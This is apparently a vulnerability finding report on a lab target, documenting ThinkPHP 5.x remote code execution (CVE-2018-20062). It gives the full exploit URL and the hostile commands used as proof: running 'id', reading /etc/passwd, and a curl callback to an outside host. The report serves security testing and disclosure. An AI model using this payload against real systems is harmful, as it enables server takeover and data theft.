findings.reported_class: OS command injection / Remote Code Execution (ThinkPHP 5.x invokefunction RCE, CVE-2018-20062)
findings.evidence:
The target runs ThinkPHP V5 (PHP/7.2.31, Apache/2.4.38). The route /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=<cmd> allows arbitrary PHP function invocation leading to OS command execution.

Proofs (all via live target):
1) vars[0]=phpinfo returned the full phpinfo() page (PHP Version 7.2.31, Linux 0b84890161b8 ...).
2) vars[0]=system&vars[1][]=id returned: uid=33(www-data) gid=33(www-data) groups=33(www-data)
3) vars[0]=system&vars[1][]=cat /etc/passwd returned the full /etc/passwd including root:x:0:0:root:/root:/bin/bash and www-data:x:33:33:...
4) OOB verification: system('curl http://host.docker.internal:60658/48e97934f085d7f44a8ba2795289680e/index.php') executed and returned "okok" (callback fetched successfully), proving outbound code execution from the server.
